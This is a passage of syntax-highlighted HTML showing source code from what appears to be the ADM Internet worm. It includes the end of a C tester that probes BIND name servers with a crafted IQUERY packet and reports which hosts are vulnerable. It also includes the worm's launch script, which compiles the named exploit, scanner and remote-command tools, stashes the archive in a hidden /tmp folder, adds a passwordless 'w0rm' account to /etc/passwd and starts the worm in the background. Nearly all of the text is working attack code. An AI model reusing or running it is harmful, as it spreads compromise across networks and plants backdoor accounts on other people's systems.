   </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">connect</span><span class="sc10">(</span><span class="sc11">sd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">sockaddr</span><span class="sc0"> </span><span class="sc10">*)&amp;</span><span class="sc11">ra</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">ra</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0">
     </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">perror</span><span class="sc10">(</span><span class="sc6">"Unable to connect"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">close</span><span class="sc10">(</span><span class="sc11">sd</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">
     </span><span class="sc10">}</span><span class="sc0">
   
   </span><span class="sc11">alarm</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">

   </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">he</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">gethostbyaddr</span><span class="sc10">((</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*)&amp;</span><span class="sc11">ra</span><span class="sc10">.</span><span class="sc11">sin_addr</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">ra</span><span class="sc10">.</span><span class="sc11">sin_addr</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc11">AF_INET</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">hostent</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc5">NULL</span><span class="sc10">)</span><span class="sc0">
      </span><span class="sc11">sprintf</span><span class="sc10">(</span><span class="sc11">rname</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"%s"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">inet_ntoa</span><span class="sc10">(</span><span class="sc11">ra</span><span class="sc10">.</span><span class="sc11">sin_addr</span><span class="sc10">));</span><span class="sc0">
   </span><span class="sc5">else</span><span class="sc0">
      </span><span class="sc11">strncpy</span><span class="sc10">(</span><span class="sc11">rname</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">he</span><span class="sc10">-&gt;</span><span class="sc11">h_name</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">rname</span><span class="sc10">));</span><span class="sc0">

   </span><span class="sc11">pktlen</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">make_keypkt</span><span class="sc10">(</span><span class="sc11">keypkt</span><span class="sc10">);</span><span class="sc0">
   </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(!</span><span class="sc11">send_packet</span><span class="sc10">(</span><span class="sc11">sd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">keypkt</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">pktlen</span><span class="sc10">))</span><span class="sc0">
      </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">
   </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(!</span><span class="sc11">get_packet</span><span class="sc10">(</span><span class="sc11">sd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">inbuf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">pktlen</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0"> </span><span class="sc11">pktlen</span><span class="sc0"> </span><span class="sc10">&lt;=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
      </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">
   </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">vulnerable</span><span class="sc10">(</span><span class="sc11">inbuf</span><span class="sc10">))</span><span class="sc0">
      </span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"%s is vulnerable.\n"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">rname</span><span class="sc10">);</span><span class="sc0">
   </span><span class="sc5">else</span><span class="sc0">
      </span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"%s is not vulnerable.\n"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">rname</span><span class="sc10">);</span><span class="sc0">
   </span><span class="sc11">close</span><span class="sc10">(</span><span class="sc11">sd</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc16">void</span><span class="sc0">
</span><span class="sc11">handle_alarm</span><span class="sc10">(</span><span class="sc11">sn</span><span class="sc10">)</span><span class="sc0">
   </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">sn</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
   </span><span class="sc11">alarm</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
   </span><span class="sc11">signal</span><span class="sc10">(</span><span class="sc11">SIGALRM</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">SIG_DFL</span><span class="sc10">);</span><span class="sc0">
   </span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"Unable to connect: Connection timed out\n"</span><span class="sc10">);</span><span class="sc0">
   </span><span class="sc11">exit</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc16">int</span><span class="sc0">
</span><span class="sc11">make_keypkt</span><span class="sc10">(</span><span class="sc11">pktbuf</span><span class="sc10">)</span><span class="sc0">
   </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">pktbuf</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
   </span><span class="sc11">HEADER</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">dnsh</span><span class="sc10">;</span><span class="sc0">
   </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">ptr</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">pktbuf</span><span class="sc10">;</span><span class="sc0">
   </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">pktlen</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
   </span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">long</span><span class="sc0"> </span><span class="sc11">ttl</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">31337</span><span class="sc10">;</span><span class="sc0">
   </span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">long</span><span class="sc0"> </span><span class="sc11">addr</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">inet_addr</span><span class="sc10">(</span><span class="sc6">"1.2.3.4"</span><span class="sc10">);</span><span class="sc0">

   </span><span class="sc11">memset</span><span class="sc10">(</span><span class="sc11">pktbuf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">pktbuf</span><span class="sc10">));</span><span class="sc0">

</span><span class="sc1">/* fill the dns header */</span><span class="sc0">
   </span><span class="sc11">dnsh</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">HEADER</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc11">ptr</span><span class="sc10">;</span><span class="sc0">
   </span><span class="sc11">dnsh</span><span class="sc10">-&gt;</span><span class="sc11">id</span><span class="sc0">     </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">htons</span><span class="sc10">(</span><span class="sc11">rand</span><span class="sc10">()%</span><span class="sc4">65535</span><span class="sc10">);</span><span class="sc0">
   </span><span class="sc11">dnsh</span><span class="sc10">-&gt;</span><span class="sc11">qr</span><span class="sc0">     </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
   </span><span class="sc11">dnsh</span><span class="sc10">-&gt;</span><span class="sc11">opcode</span><span class="sc0">     </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">IQUERY</span><span class="sc10">;</span><span class="sc0">
   </span><span class="sc11">dnsh</span><span class="sc10">-&gt;</span><span class="sc11">aa</span><span class="sc0">     </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
   </span><span class="sc11">dnsh</span><span class="sc10">-&gt;</span><span class="sc11">tc</span><span class="sc0">     </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
   </span><span class="sc11">dnsh</span><span class="sc10">-&gt;</span><span class="sc11">rd</span><span class="sc0">     </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
   </span><span class="sc11">dnsh</span><span class="sc10">-&gt;</span><span class="sc11">ra</span><span class="sc0">     </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
   </span><span class="sc11">dnsh</span><span class="sc10">-&gt;</span><span class="sc11">unused</span><span class="sc0">     </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc1">/* removed for portability (it's zero already)
   dnsh-&gt;pr     = 0;
 */</span><span class="sc0">
   </span><span class="sc11">dnsh</span><span class="sc10">-&gt;</span><span class="sc11">rcode</span><span class="sc0">      </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
   </span><span class="sc11">dnsh</span><span class="sc10">-&gt;</span><span class="sc11">qdcount</span><span class="sc0">    </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">htons</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
   </span><span class="sc11">dnsh</span><span class="sc10">-&gt;</span><span class="sc11">ancount</span><span class="sc0">    </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">htons</span><span class="sc10">(</span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">
   </span><span class="sc11">dnsh</span><span class="sc10">-&gt;</span><span class="sc11">nscount</span><span class="sc0">    </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">htons</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
   </span><span class="sc11">dnsh</span><span class="sc10">-&gt;</span><span class="sc11">arcount</span><span class="sc0">    </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">htons</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
   </span><span class="sc11">pktlen</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">HEADER</span><span class="sc10">);</span><span class="sc0">
   </span><span class="sc11">ptr</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">HEADER</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc1">/* this is the domain name (nothing here) */</span><span class="sc0">
   </span><span class="sc10">*(</span><span class="sc11">ptr</span><span class="sc10">++)</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc7">'\0'</span><span class="sc10">;</span><span class="sc0">
   </span><span class="sc11">pktlen</span><span class="sc10">++;</span><span class="sc0">
</span><span class="sc1">/* fill out the rest of the rr */</span><span class="sc0">
   </span><span class="sc11">PUTSHORT</span><span class="sc10">(</span><span class="sc11">T_A</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">ptr</span><span class="sc10">);</span><span class="sc0">
   </span><span class="sc11">PUTSHORT</span><span class="sc10">(</span><span class="sc11">C_IN</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">ptr</span><span class="sc10">);</span><span class="sc0">
   </span><span class="sc11">PUTLONG</span><span class="sc10">(</span><span class="sc11">ttl</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">ptr</span><span class="sc10">);</span><span class="sc0">
   </span><span class="sc11">PUTSHORT</span><span class="sc10">(</span><span class="sc4">4</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">ptr</span><span class="sc10">);</span><span class="sc0">
   </span><span class="sc11">PUTLONG</span><span class="sc10">(</span><span class="sc11">addr</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">ptr</span><span class="sc10">);</span><span class="sc0">
   </span><span class="sc11">ptr</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc4">4</span><span class="sc10">;</span><span class="sc0">
   </span><span class="sc11">pktlen</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc16">short</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc0"> </span><span class="sc4">3</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc16">long</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">4</span><span class="sc10">);</span><span class="sc0">

   </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">pktlen</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc16">int</span><span class="sc0">
</span><span class="sc11">send_packet</span><span class="sc10">(</span><span class="sc11">sd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">pktbuf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">pktlen</span><span class="sc10">)</span><span class="sc0">
   </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">sd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">pktlen</span><span class="sc10">;</span><span class="sc0">
   </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">pktbuf</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
   </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">tmp</span><span class="sc10">[</span><span class="sc4">2</span><span class="sc10">],</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">tmpptr</span><span class="sc10">;</span><span class="sc0">

   </span><span class="sc11">tmpptr</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">tmp</span><span class="sc10">;</span><span class="sc0">
   </span><span class="sc11">PUTSHORT</span><span class="sc10">(</span><span class="sc11">pktlen</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">tmpptr</span><span class="sc10">);</span><span class="sc0">
   </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">write</span><span class="sc10">(</span><span class="sc11">sd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">tmp</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">2</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc4">2</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0"> </span><span class="sc11">write</span><span class="sc10">(</span><span class="sc11">sd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">pktbuf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">pktlen</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc11">pktlen</span><span class="sc10">)</span><span class="sc0">
     </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">perror</span><span class="sc10">(</span><span class="sc6">"write failed"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
     </span><span class="sc10">}</span><span class="sc0">
   </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc16">int</span><span class="sc0">
</span><span class="sc11">get_packet</span><span class="sc10">(</span><span class="sc11">sd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">pktbuf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">pktlen</span><span class="sc10">)</span><span class="sc0">
   </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">sd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">pktlen</span><span class="sc10">;</span><span class="sc0">
   </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">pktbuf</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
   </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">tmp</span><span class="sc10">[</span><span class="sc4">2</span><span class="sc10">],</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">tmpptr</span><span class="sc10">;</span><span class="sc0">

   </span><span class="sc11">tmpptr</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">tmp</span><span class="sc10">;</span><span class="sc0">
   </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">read</span><span class="sc10">(</span><span class="sc11">sd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">tmp</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">2</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc4">2</span><span class="sc10">)</span><span class="sc0">
     </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">perror</span><span class="sc10">(</span><span class="sc6">"read failed"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
     </span><span class="sc10">}</span><span class="sc0">
   </span><span class="sc11">GETSHORT</span><span class="sc10">(*</span><span class="sc11">pktlen</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">tmpptr</span><span class="sc10">);</span><span class="sc0">
   </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">read</span><span class="sc10">(</span><span class="sc11">sd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">pktbuf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">pktlen</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">pktlen</span><span class="sc10">)</span><span class="sc0">
     </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">perror</span><span class="sc10">(</span><span class="sc6">"read failed"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
     </span><span class="sc10">}</span><span class="sc0">
   </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc16">int</span><span class="sc0">
</span><span class="sc11">vulnerable</span><span class="sc10">(</span><span class="sc11">pktbuf</span><span class="sc10">)</span><span class="sc0">
   </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">pktbuf</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
   </span><span class="sc11">HEADER</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">dnsh</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">HEADER</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc11">pktbuf</span><span class="sc10">;</span><span class="sc0">

   </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">dnsh</span><span class="sc10">-&gt;</span><span class="sc11">rcode</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
      </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
   </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">
</span><span class="sc11">w0rm</span><span class="sc10">/</span><span class="sc11">startup</span><span class="sc0"></span><span class="sc4">100755</span><span class="sc0">      </span><span class="sc4">0</span><span class="sc0">      </span><span class="sc4">0</span><span class="sc0">        </span><span class="sc4">1236</span><span class="sc0">  </span><span class="sc4">6526726267</span><span class="sc0">  </span><span class="sc4">11476</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc0"></span><span class="sc11">ustar</span><span class="sc0">  </span><span class="sc11">root</span><span class="sc0"></span><span class="sc11">root</span><span class="sc0">#</span><span class="sc10">!</span><span class="sc14">/bin/sh</span><span class="sc0">
</span><span class="sc11">PATH</span><span class="sc10">=</span><span class="sc6">"/bin/:/usr/sbin/:/usr/bin:/sbin:/usr/local/bin:."</span><span class="sc0">
</span><span class="sc11">export</span><span class="sc0"> </span><span class="sc11">PATH</span><span class="sc0">

</span><span class="sc11">PROGGIES</span><span class="sc10">=</span><span class="sc6">"./test ./Hnamed ./gimmeRAND ./scanco ./remotecmd  ./gimmeIP ./incremental ./ADMw0rm"</span><span class="sc0">
</span><span class="sc11">echo</span><span class="sc0"> </span><span class="sc6">"compile the proggies..."</span><span class="sc0">
</span><span class="sc11">gcc</span><span class="sc0"> </span><span class="sc11">testvuln</span><span class="sc10">.</span><span class="sc11">c</span><span class="sc0">     </span><span class="sc10">-</span><span class="sc11">o</span><span class="sc0">    </span><span class="sc10">./</span><span class="sc11">test</span><span class="sc0">
</span><span class="sc11">gcc</span><span class="sc0"> </span><span class="sc11">named_ADMv2</span><span class="sc10">.</span><span class="sc11">c</span><span class="sc0">  </span><span class="sc10">-</span><span class="sc11">o</span><span class="sc0">    </span><span class="sc10">./</span><span class="sc11">Hnamed</span><span class="sc0">
</span><span class="sc11">gcc</span><span class="sc0"> </span><span class="sc11">gimmeRAND</span><span class="sc10">.</span><span class="sc11">c</span><span class="sc0">    </span><span class="sc10">-</span><span class="sc11">o</span><span class="sc0">    </span><span class="sc10">./</span><span class="sc11">gimmeRAND</span><span class="sc0">
</span><span class="sc11">gcc</span><span class="sc0"> </span><span class="sc11">scanconnect</span><span class="sc10">.</span><span class="sc11">c</span><span class="sc0">  </span><span class="sc10">-</span><span class="sc11">o</span><span class="sc0">    </span><span class="sc10">./</span><span class="sc11">scanco</span><span class="sc0">
</span><span class="sc11">gcc</span><span class="sc0"> </span><span class="sc11">remotecmd</span><span class="sc10">.</span><span class="sc11">c</span><span class="sc0">    </span><span class="sc10">-</span><span class="sc11">o</span><span class="sc0">    </span><span class="sc10">./</span><span class="sc11">remotecmd</span><span class="sc0">
</span><span class="sc11">echo</span><span class="sc0"> </span><span class="sc6">"done..."</span><span class="sc0">
</span><span class="sc11">echo</span><span class="sc0"> </span><span class="sc6">"make the ADMw0rm.tgz"</span><span class="sc0">
</span><span class="sc11">tar</span><span class="sc0"> </span><span class="sc11">cfvz</span><span class="sc0"> </span><span class="sc11">ADMw0rm</span><span class="sc10">.</span><span class="sc11">tgz</span><span class="sc0">  </span><span class="sc11">$PROGGIES</span><span class="sc0">
</span><span class="sc11">echo</span><span class="sc0"> </span><span class="sc6">"install the user w0rm.."</span><span class="sc0"> 
</span><span class="sc11">mkdir</span><span class="sc0"> </span><span class="sc10">/</span><span class="sc11">tmp</span><span class="sc10">/.</span><span class="sc11">w0rm0r</span><span class="sc10">/</span><span class="sc0">
</span><span class="sc11">cp</span><span class="sc0"> </span><span class="sc11">ADMw0rm</span><span class="sc10">.</span><span class="sc11">tgz</span><span class="sc0"> </span><span class="sc10">/</span><span class="sc11">tmp</span><span class="sc10">/.</span><span class="sc11">w0rm0r</span><span class="sc10">/</span><span class="sc0">
</span><span class="sc11">echo</span><span class="sc0"> </span><span class="sc6">"w0rm::2666:777:ADM Inet W0rm:/:/bin/sh"</span><span class="sc0"> </span><span class="sc10">&gt;&gt;</span><span class="sc0"> </span><span class="sc10">/</span><span class="sc11">etc</span><span class="sc10">/</span><span class="sc11">passwd</span><span class="sc0">
</span><span class="sc11">echo</span><span class="sc0"> </span><span class="sc6">"launch the w0rm!!!"</span><span class="sc0">
</span><span class="sc11">nohup</span><span class="sc0"> </span><span class="sc10">./</span><span class="sc11">ADMw0rm</span><span class="sc0">  </span><span class="sc10">&amp;</span><span class="sc0">
</span><span class="sc11">echo</span><span class="sc0"> </span><span class="sc6">"-==* The ADM Crew *==-"</span><span class="sc0"></span></div></body>
</html>
